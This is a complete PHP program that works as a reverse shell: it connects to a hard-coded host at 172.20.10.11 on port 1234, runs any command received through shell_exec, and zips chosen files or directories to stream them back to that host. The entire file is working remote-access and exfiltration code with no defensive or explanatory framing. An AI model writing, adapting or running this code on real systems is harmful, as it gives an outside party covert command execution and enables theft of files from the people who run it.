<?php

class Client
{

    public function __construct()
    {

        echo 'Client started !';

        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        $result = socket_connect($socket, '172.20.10.11', 1234);

        if (!$result) {
            echo "socket_connect() failed.\nReason: ($result) " . socket_strerror(socket_last_error($socket)) . "\n";
            return;
        }

        echo "Connected !\n";

        while (true) {

            $buf = socket_read($socket, 2048);
            if ($buf === "") {
                break;
            } else {
                $commands = explode(" ", $buf);
                print_r($commands);
                switch ($commands[0]) {
                    case "os_system":
                        socket_write($socket, PHP_OS);
                        break;

                    case "zip":

                        $filename = "./zipArchive.zip";
                        $zip = new ZipArchive();

                        if (array_key_exists(1, $commands)) {

                            if ($zip->open($filename, ZipArchive::CREATE) !== true) {
                                exit("Impossible d'ouvrir le fichier <$filename>\n");
                            }

                            $source = realpath($commands[1]);

                            if (is_dir($source) === true) {

                                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                                foreach ($files as $file) {

                                    $file = realpath($file);

                                    if (is_dir($file) === true) {

                                        if ($file != $source) {
                                            $zip->addEmptyDir(str_replace($source . '\\', '', $file . '/'));
                                        }

                                    } else if (is_file($file) === true) {
                                        $zip->addFromString(str_replace($source . '\\', '', $file), file_get_contents($file));
                                    }
                                }
                            } else if (is_file($source) === true) {
                                $zip->addFromString(basename($source), file_get_contents($source));
                            }

                            $zip->close();

                            $file = fopen($filename, 'rb');

                            $str = "zip:" . filesize($filename);

                            socket_write($socket, $str, 2048);

                            while (($buf = fread($file, 2048)) != false) {
                                socket_write($socket, $buf, 2048);
                            }

                            // ZIP finish

                        } else {
                            socket_write($socket, "Erreur : Merci de signifier l'argument");
                        }
                        break;

                    default:
                        echo "Exec : $buf";
                        socket_write($socket, shell_exec($buf));
                        break;
                }
            }
        }
    }

    public function addFile($zip, $dir)
    {

    }

    public function send()
    {

    }
}

new Client();
